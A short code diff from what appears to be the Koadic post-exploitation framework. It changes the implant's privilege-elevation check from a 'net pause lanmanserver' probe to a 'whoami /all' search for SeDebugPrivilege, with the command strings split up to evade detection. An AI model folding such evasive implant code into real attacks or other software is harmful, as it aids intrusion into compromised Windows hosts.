@@ -137,11 +137,11 @@ Koadic.user.isElevated = function()
 {
     try
     {
-        var #res# = Koadic.shell.exec("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+Koadic.uuid()+".txt");
-        if (#res#.indexOf("5") == -1)
-            return true;
-        else
+        var #res# = Koadic.shell.exec("whoa"+"mi /"+"all", "%TE"+"MP%\\"+Koadic.uuid()+".txt");
+        if (#res#.indexOf("SeDebugPrivilege") == -1)
             return false;
+        else
+            return true;
     }
     catch(e)
     {
